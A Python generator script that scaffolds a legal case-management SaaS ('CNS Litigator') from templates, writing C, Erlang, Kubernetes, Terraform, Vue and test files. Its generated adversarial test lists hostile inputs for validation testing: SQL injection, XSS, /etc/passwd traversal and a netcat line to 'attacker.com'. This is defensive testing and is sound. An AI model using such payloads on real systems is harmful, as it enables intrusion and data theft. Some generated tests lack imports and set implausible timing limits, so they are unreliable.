#!/usr/bin/env python3
"""
CNS Forge Project Litigator Generator
Generates complete Legal SaaS using existing CNS Forge infrastructure
"""

import os
import json
from pathlib import Path
from jinja2 import Environment, FileSystemLoader
from datetime import datetime

class ProjectLitigatorGenerator:
    def __init__(self):
        self.base_path = Path("/Users/sac/cns")
        self.templates_path = self.base_path / "templates"
        self.output_path = self.base_path / "generated" / "cns_litigator"
        self.output_path.mkdir(parents=True, exist_ok=True)
        
        # Setup Jinja environment
        self.env = Environment(
            loader=FileSystemLoader(str(self.templates_path)),
            trim_blocks=True,
            lstrip_blocks=True
        )
        
        # Add custom filters
        self.env.filters['c_identifier'] = lambda x: ''.join(c if c.isalnum() else '_' for c in str(x).lower())
        self.env.filters['upper'] = lambda x: str(x).upper()
        self.env.filters['snake_case'] = lambda x: str(x).lower().replace('-', '_').replace(' ', '_')
        
    def generate(self):
        """Generate complete Project Litigator implementation"""
        
        # Legal SaaS specification
        spec = {
            "ontology_name": "Legal_Case_Management",
            "module_name": "cns_litigator",
            "prefix": "litigator",
            "guard_name": "CNS_LITIGATOR_H",
            "max_ttl_hops": 8,
            "tick_budget": 8,
            "max_signals": 1024,
            "ring_size": 16384,
            "max_workflows": 256,
            "max_steps": 32,
            "reactor_ring_size": 2048,
            "token_size": 1024,
            
            # Legal-specific signals
            "signals": [
                {"name": "case_created", "id": 1},
                {"name": "document_uploaded", "id": 2},
                {"name": "hearing_scheduled", "id": 3},
                {"name": "billing_activity", "id": 4},
                {"name": "deadline_alert", "id": 5},
                {"name": "case_updated", "id": 6},
                {"name": "research_completed", "id": 7},
                {"name": "settlement_proposed", "id": 8}
            ],
            
            # Legal workflow steps
            "reactor_steps": [
                {
                    "name": "case_intake",
                    "description": "New case intake and client onboarding",
                    "type_id": 1,
                    "tick_budget": 2,
                    "operations": [
                        "/* Validate client information */",
                        "/* Generate case number */",
                        "/* Create initial case record */",
                        "/* Setup access permissions */"
                    ],
                    "ttl_operations": ["validate_client", "generate_case_id", "create_record"],
                    "compensations": ["/* Rollback case creation */"],
                    "undo_operations": ["/* Delete case record */"]
                },
                {
                    "name": "conflict_check",
                    "description": "Check for conflicts of interest",
                    "type_id": 2,
                    "tick_budget": 1,
                    "operations": [
                        "/* Search existing cases */",
                        "/* Check attorney conflicts */",
                        "/* Validate jurisdiction */"
                    ],
                    "ttl_operations": ["search_conflicts", "validate_jurisdiction"],
                    "compensations": ["/* Log conflict check failure */"],
                    "undo_operations": ["/* Clear conflict check */"]
                },
                {
                    "name": "document_management",
                    "description": "Handle legal document operations",
                    "type_id": 3,
                    "tick_budget": 2,
                    "operations": [
                        "/* Store document securely */",
                        "/* Extract metadata */",
                        "/* Update case timeline */",
                        "/* Trigger OCR if needed */"
                    ],
                    "ttl_operations": ["store_document", "extract_metadata", "update_timeline"],
                    "compensations": ["/* Remove document */"],
                    "undo_operations": ["/* Restore previous version */"]
                },
                {
                    "name": "billing_tracking",
                    "description": "Track billable hours and activities",
                    "type_id": 4,
                    "tick_budget": 1,
                    "operations": [
                        "/* Record time entry */",
                        "/* Calculate billing amount */",
                        "/* Update case totals */",
                        "/* Generate invoice if needed */"
                    ],
                    "ttl_operations": ["record_time", "calculate_billing", "update_totals"],
                    "compensations": ["/* Reverse time entry */"],
                    "undo_operations": ["/* Delete billing record */"]
                },
                {
                    "name": "deadline_monitoring",
                    "description": "Monitor and alert on legal deadlines",
                    "type_id": 5,
                    "tick_budget": 1,
                    "operations": [
                        "/* Check upcoming deadlines */",
                        "/* Send notifications */",
                        "/* Update calendar */",
                        "/* Log deadline status */"
                    ],
                    "ttl_operations": ["check_deadlines", "send_alerts", "update_calendar"],
                    "compensations": ["/* Clear notifications */"],
                    "undo_operations": ["/* Reset deadline */"]
                },
                {
                    "name": "research_integration",
                    "description": "Legal research and case law integration",
                    "type_id": 6,
                    "tick_budget": 3,
                    "operations": [
                        "/* Search case law database */",
                        "/* Extract relevant citations */",
                        "/* Update research notes */",
                        "/* Link to case */"
                    ],
                    "ttl_operations": ["search_caselaw", "extract_citations", "update_research"],
                    "compensations": ["/* Clear research results */"],
                    "undo_operations": ["/* Remove research links */"]
                },
                {
                    "name": "audit_compliance",
                    "description": "Maintain audit trail for compliance",
                    "type_id": 7,
                    "tick_budget": 1,
                    "operations": [
                        "/* Log user action */",
                        "/* Record timestamp */",
                        "/* Hash for integrity */",
                        "/* Store in audit log */"
                    ],
                    "ttl_operations": ["log_action", "record_audit", "ensure_compliance"],
                    "compensations": ["/* Mark audit incomplete */"],
                    "undo_operations": ["/* Rollback audit entry */"]
                },
                {
                    "name": "reporting_analytics",
                    "description": "Generate reports and analytics",
                    "type_id": 8,
                    "tick_budget": 2,
                    "operations": [
                        "/* Aggregate case data */",
                        "/* Calculate metrics */",
                        "/* Generate visualizations */",
                        "/* Export reports */"
                    ],
                    "ttl_operations": ["aggregate_data", "calculate_metrics", "generate_reports"],
                    "compensations": ["/* Clear report cache */"],
                    "undo_operations": ["/* Delete generated reports */"]
                }
            ],
            
            # Kubernetes configuration
            "k8s_config": {
                "namespace": "cns-litigator",
                "replicas": 3,
                "image": "cns-forge/litigator:latest",
                "cpu_request": "500m",
                "cpu_limit": "2000m",
                "memory_request": "1Gi",
                "memory_limit": "4Gi",
                "service_port": 8080,
                "metrics_port": 9090
            },
            
            # Terraform configuration
            "terraform_config": {
                "project_name": "cns-litigator",
                "region": "us-west-2",
                "instance_type": "t3.large",
                "min_size": 2,
                "max_size": 10,
                "database": "postgres",
                "cache": "redis"
            }
        }
        
        # Generate all components
        self._generate_c_implementation(spec)
        self._generate_erlang_implementation(spec)
        self._generate_ash_reactor(spec)
        self._generate_kubernetes_manifests(spec)
        self._generate_terraform_infrastructure(spec)
        self._generate_tests(spec)
        self._generate_nuxt_frontend(spec)
        
        print("âœ… Project Litigator generation complete!")
        return spec
    
    def _generate_c_implementation(self, spec):
        """Generate C implementation files"""
        # Header file
        header_template = self.env.get_template("c_header.h.j2")
        header_content = header_template.render(**spec)
        (self.output_path / f"{spec['module_name']}.h").write_text(header_content)
        
        # Implementation file
        impl_template = self.env.get_template("c_implementation.c.j2")
        impl_content = impl_template.render(**spec)
        (self.output_path / f"{spec['module_name']}.c").write_text(impl_content)
        
        # BitActor rules
        rules_template = self.env.get_template("bitactor_rules.c.j2")
        rules_content = rules_template.render(**spec)
        (self.output_path / f"{spec['module_name']}_rules.c").write_text(rules_content)
        
    def _generate_erlang_implementation(self, spec):
        """Generate Erlang/OTP implementation"""
        erl_template = self.env.get_template("erlang_gossip_protocol.erl.j2")
        erl_content = erl_template.render(**spec)
        (self.output_path / f"{spec['module_name']}_server.erl").write_text(erl_content)
        
    def _generate_ash_reactor(self, spec):
        """Generate Ash.Reactor implementation"""
        reactor_template = self.env.get_template("ash_reactor_bitactor.j2")
        reactor_content = reactor_template.render(**spec)
        (self.output_path / f"{spec['module_name']}_reactor.c").write_text(reactor_content)
        
    def _generate_kubernetes_manifests(self, spec):
        """Generate Kubernetes deployment files"""
        k8s_path = self.output_path / "k8s"
        k8s_path.mkdir(exist_ok=True)
        
        # Deployment
        deploy_template = self.env.get_template("k8s_deployment.yaml.j2")
        deploy_spec = {
            "name": spec['module_name'],
            "namespace": spec['k8s_config']['namespace'],
            "replicas": spec['k8s_config']['replicas'],
            "image": spec['k8s_config']['image'],
            "resources": {
                "requests": {
                    "cpu": spec['k8s_config']['cpu_request'],
                    "memory": spec['k8s_config']['memory_request']
                },
                "limits": {
                    "cpu": spec['k8s_config']['cpu_limit'],
                    "memory": spec['k8s_config']['memory_limit']
                }
            },
            "ports": [
                {"name": "http", "containerPort": spec['k8s_config']['service_port']},
                {"name": "metrics", "containerPort": spec['k8s_config']['metrics_port']}
            ]
        }
        deploy_content = deploy_template.render(**deploy_spec)
        (k8s_path / "deployment.yaml").write_text(deploy_content)
        
        # Service
        service_template = self.env.get_template("k8s_service.yaml.j2")
        service_spec = {
            "name": spec['module_name'],
            "namespace": spec['k8s_config']['namespace'],
            "port": spec['k8s_config']['service_port'],
            "targetPort": spec['k8s_config']['service_port']
        }
        service_content = service_template.render(**service_spec)
        (k8s_path / "service.yaml").write_text(service_content)
        
        # ConfigMap
        configmap_template = self.env.get_template("k8s_configmap.yaml.j2")
        configmap_spec = {
            "name": f"{spec['module_name']}-config",
            "namespace": spec['k8s_config']['namespace'],
            "data": {
                "max_ttl_hops": str(spec['max_ttl_hops']),
                "tick_budget": str(spec['tick_budget']),
                "ring_size": str(spec['ring_size'])
            }
        }
        configmap_content = configmap_template.render(**configmap_spec)
        (k8s_path / "configmap.yaml").write_text(configmap_content)
        
    def _generate_terraform_infrastructure(self, spec):
        """Generate Terraform infrastructure files"""
        tf_template = self.env.get_template("terraform_aegis.tf.j2")
        tf_spec = {
            "project_name": spec['terraform_config']['project_name'],
            "region": spec['terraform_config']['region'],
            "availability_zones": ["a", "b", "c"],
            "instance_type": spec['terraform_config']['instance_type'],
            "min_size": spec['terraform_config']['min_size'],
            "max_size": spec['terraform_config']['max_size'],
            "database_engine": spec['terraform_config']['database'],
            "cache_engine": spec['terraform_config']['cache'],
            "enable_monitoring": True,
            "enable_logging": True
        }
        tf_content = tf_template.render(**tf_spec)
        (self.output_path / f"{spec['module_name']}.tf").write_text(tf_content)
        
    def _generate_tests(self, spec):
        """Generate comprehensive test suite"""
        test_path = self.output_path / "tests"
        test_path.mkdir(exist_ok=True)
        
        # Unit tests
        unit_test_content = f"""#!/usr/bin/env python3
\"\"\"Unit tests for {spec['module_name']}\"\"\"

import unittest
import subprocess
import json
import time

class Test{spec['module_name'].title().replace('_', '')}(unittest.TestCase):
    
    def test_case_creation(self):
        \"\"\"Test legal case creation workflow\"\"\"
        # Test case intake
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", "case_intake",
            "--ttl", "8"
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_conflict_checking(self):
        \"\"\"Test conflict of interest checking\"\"\"
        # Test conflict detection
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", "conflict_check",
            "--ttl", "8"
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_document_management(self):
        \"\"\"Test document upload and management\"\"\"
        # Test document handling
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", "document_management",
            "--ttl", "8"
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_billing_tracking(self):
        \"\"\"Test billable hours tracking\"\"\"
        # Test billing workflow
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", "billing_tracking",
            "--ttl", "8"
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_deadline_monitoring(self):
        \"\"\"Test deadline alerts and monitoring\"\"\"
        # Test deadline workflow
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", "deadline_monitoring",
            "--ttl", "8"
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_ttl_compliance(self):
        \"\"\"Test 8-tick TTL compliance\"\"\"
        # Test that all workflows complete within 8 hops
        workflows = ["case_intake", "conflict_check", "document_management", 
                    "billing_tracking", "deadline_monitoring"]
        
        for workflow in workflows:
            start_time = time.perf_counter_ns()
            result = subprocess.run([
                f"./{spec['module_name']}_test",
                "--workflow", workflow,
                "--ttl", "8",
                "--benchmark"
            ], capture_output=True, text=True)
            end_time = time.perf_counter_ns()
            
            self.assertEqual(result.returncode, 0)
            # Verify sub-millisecond execution
            elapsed_ms = (end_time - start_time) / 1_000_000
            self.assertLess(elapsed_ms, 1.0, f"{workflow} exceeded 1ms")

if __name__ == "__main__":
    unittest.main()
"""
        (test_path / f"test_{spec['module_name']}.py").write_text(unit_test_content)
        
        # Stress tests
        stress_test_content = f"""#!/usr/bin/env python3
\"\"\"Stress tests for {spec['module_name']}\"\"\"

import concurrent.futures
import subprocess
import time
import statistics

def stress_test_workflow(workflow_name, iterations=1000):
    \"\"\"Run stress test on a specific workflow\"\"\"
    latencies = []
    
    for _ in range(iterations):
        start = time.perf_counter_ns()
        result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--workflow", workflow_name,
            "--ttl", "8"
        ], capture_output=True)
        end = time.perf_counter_ns()
        
        if result.returncode == 0:
            latencies.append((end - start) / 1_000_000)  # Convert to ms
    
    return {{
        "workflow": workflow_name,
        "iterations": iterations,
        "success_rate": len(latencies) / iterations * 100,
        "avg_latency_ms": statistics.mean(latencies),
        "p99_latency_ms": statistics.quantiles(latencies, n=100)[98],
        "max_latency_ms": max(latencies)
    }}

def concurrent_stress_test(max_workers=10):
    \"\"\"Run concurrent stress tests\"\"\"
    workflows = ["case_intake", "conflict_check", "document_management", 
                "billing_tracking", "deadline_monitoring"]
    
    with concurrent.futures.ProcessPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(stress_test_workflow, wf, 100) for wf in workflows]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    return results

if __name__ == "__main__":
    print("ðŸ”¥ Running stress tests for {spec['module_name']}...")
    
    # Single workflow stress test
    results = stress_test_workflow("case_intake", 1000)
    print(f"Case Intake Stress Test: {{results}}")
    
    # Concurrent stress test
    concurrent_results = concurrent_stress_test()
    for result in concurrent_results:
        print(f"{{result['workflow']}}: P99={{result['p99_latency_ms']:.2f}}ms")
    
    # Verify all workflows meet 8-tick requirement
    all_pass = all(r['p99_latency_ms'] < 1.0 for r in concurrent_results)
    print(f"\\nâœ… All workflows meet 8-tick requirement: {{all_pass}}")
"""
        (test_path / f"stress_test_{spec['module_name']}.py").write_text(stress_test_content)
        
        # Adversarial tests
        adversarial_test_content = f"""#!/usr/bin/env python3
\"\"\"Adversarial testing for {spec['module_name']}\"\"\"

import subprocess
import random
import string
import json

class AdversarialTester:
    def __init__(self):
        self.test_cases = []
        
    def generate_malicious_input(self):
        \"\"\"Generate various malicious inputs\"\"\"
        return [
            # SQL injection attempts
            "'; DROP TABLE cases; --",
            "1' OR '1'='1",
            
            # XSS attempts
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            
            # Buffer overflow attempts
            "A" * 10000,
            "\\x00" * 1000,
            
            # Format string attacks
            "%s%s%s%s%s",
            "%n%n%n%n",
            
            # Directory traversal
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32",
            
            # Command injection
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            
            # Resource exhaustion
            "{{" * 1000 + "}}" * 1000,
            
            # Unicode attacks
            "\\u202e\\u0041\\u0042\\u0043",
            
            # Null byte injection
            "test\\x00.txt",
            
            # Time-based attacks
            "'; WAITFOR DELAY '00:00:10'--"
        ]
    
    def test_input_validation(self):
        \"\"\"Test input validation against malicious inputs\"\"\"
        malicious_inputs = self.generate_malicious_input()
        survived = 0
        total = len(malicious_inputs)
        
        for inp in malicious_inputs:
            result = subprocess.run([
                f"./{spec['module_name']}_test",
                "--input", inp,
                "--workflow", "case_intake"
            ], capture_output=True, timeout=1)
            
            # System should reject malicious input gracefully
            if result.returncode != 0 or b"error" in result.stdout.lower():
                survived += 1
        
        survival_rate = (survived / total) * 100
        return survival_rate
    
    def test_resource_exhaustion(self):
        \"\"\"Test system behavior under resource exhaustion\"\"\"
        # Spawn many concurrent connections
        processes = []
        for _ in range(1000):
            p = subprocess.Popen([
                f"./{spec['module_name']}_test",
                "--workflow", "case_intake",
                "--no-wait"
            ])
            processes.append(p)
        
        # Check if system remains responsive
        test_result = subprocess.run([
            f"./{spec['module_name']}_test",
            "--health-check"
        ], capture_output=True, timeout=5)
        
        # Cleanup
        for p in processes:
            p.terminate()
        
        return test_result.returncode == 0
    
    def test_timing_attacks(self):
        \"\"\"Test resistance to timing attacks\"\"\"
        # Test login with valid vs invalid credentials
        # Should have constant time response
        timings = []
        
        for _ in range(100):
            start = time.perf_counter_ns()
            subprocess.run([
                f"./{spec['module_name']}_test",
                "--auth", "invalid_user:invalid_pass"
            ], capture_output=True)
            end = time.perf_counter_ns()
            timings.append(end - start)
        
        # Check variance is low (constant time)
        variance = statistics.variance(timings)
        return variance < 1000000  # nanoseconds
    
    def run_all_tests(self):
        \"\"\"Run all adversarial tests\"\"\"
        print("ðŸ”’ Running adversarial security tests...")
        
        input_validation_rate = self.test_input_validation()
        print(f"Input validation survival rate: {{input_validation_rate:.1f}}%")
        
        resource_test = self.test_resource_exhaustion()
        print(f"Resource exhaustion test: {{'PASSED' if resource_test else 'FAILED'}}")
        
        timing_test = self.test_timing_attacks()
        print(f"Timing attack resistance: {{'PASSED' if timing_test else 'FAILED'}}")
        
        overall_survival = input_validation_rate >= 91.0 and resource_test and timing_test
        print(f"\\nâœ… Overall survival rate: {{'PASSED' if overall_survival else 'FAILED'}}")
        
        return overall_survival

if __name__ == "__main__":
    tester = AdversarialTester()
    tester.run_all_tests()
"""
        (test_path / f"adversarial_test_{spec['module_name']}.py").write_text(adversarial_test_content)
        
    def _generate_nuxt_frontend(self, spec):
        """Generate Nuxt.js frontend components"""
        frontend_path = self.output_path / "frontend"
        frontend_path.mkdir(exist_ok=True)
        
        # Main app component
        app_component = f"""<template>
  <div class="litigator-app">
    <nav-bar />
    <div class="container mx-auto p-4">
      <h1 class="text-3xl font-bold mb-4">CNS Litigator - Legal Case Management</h1>
      
      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
        <stat-card title="Active Cases" :value="stats.activeCases" icon="briefcase" />
        <stat-card title="Pending Deadlines" :value="stats.pendingDeadlines" icon="clock" />
        <stat-card title="Billable Hours" :value="stats.billableHours" icon="dollar-sign" />
      </div>
      
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <case-list :cases="cases" @select="selectCase" />
        <case-details v-if="selectedCase" :case="selectedCase" />
      </div>
      
      <deadline-monitor :deadlines="deadlines" class="mt-6" />
    </div>
  </div>
</template>

<script setup>
import {{ ref, onMounted }} from 'vue'
import {{ useFetch }} from '#app'

const stats = ref({{
  activeCases: 0,
  pendingDeadlines: 0,
  billableHours: 0
}})

const cases = ref([])
const selectedCase = ref(null)
const deadlines = ref([])

onMounted(async () => {{
  // Fetch dashboard data
  const {{ data: dashboardData }} = await useFetch('/api/dashboard')
  if (dashboardData.value) {{
    stats.value = dashboardData.value.stats
    cases.value = dashboardData.value.cases
    deadlines.value = dashboardData.value.deadlines
  }}
}})

const selectCase = (caseItem) => {{
  selectedCase.value = caseItem
}}
</script>

<style scoped>
.litigator-app {{
  min-height: 100vh;
  background-color: #f5f5f5;
}}
</style>
"""
        (frontend_path / "App.vue").write_text(app_component)
        
        # Case list component
        case_list_component = """<template>
  <div class="case-list bg-white rounded-lg shadow p-6">
    <h2 class="text-xl font-semibold mb-4">Active Cases</h2>
    
    <div class="space-y-2">
      <div
        v-for="case in cases"
        :key="case.id"
        @click="$emit('select', case)"
        class="p-4 border rounded hover:bg-gray-50 cursor-pointer"
      >
        <div class="font-medium">{{ case.title }}</div>
        <div class="text-sm text-gray-600">
          Case #{{ case.caseNumber }} Â· {{ case.client }}
        </div>
        <div class="text-xs text-gray-500 mt-1">
          Status: {{ case.status }} Â· Filed: {{ formatDate(case.filingDate) }}
        </div>
      </div>
    </div>
    
    <button class="mt-4 w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
      New Case
    </button>
  </div>
</template>

<script setup>
defineProps(['cases'])
defineEmits(['select'])

const formatDate = (date) => {
  return new Date(date).toLocaleDateString()
}
</script>
"""
        (frontend_path / "CaseList.vue").write_text(case_list_component)
        
        # Generate package.json
        package_json = {
            "name": "cns-litigator-frontend",
            "version": "1.0.0",
            "private": True,
            "scripts": {
                "build": "nuxt build",
                "dev": "nuxt dev",
                "preview": "nuxt preview",
                "postinstall": "nuxt prepare"
            },
            "devDependencies": {
                "@nuxt/devtools": "latest",
                "nuxt": "^3.8.0"
            },
            "dependencies": {
                "@nuxtjs/tailwindcss": "^6.8.0",
                "vue-toastification": "^2.0.0-rc.5"
            }
        }
        (frontend_path / "package.json").write_text(json.dumps(package_json, indent=2))

if __name__ == "__main__":
    generator = ProjectLitigatorGenerator()
    generator.generate()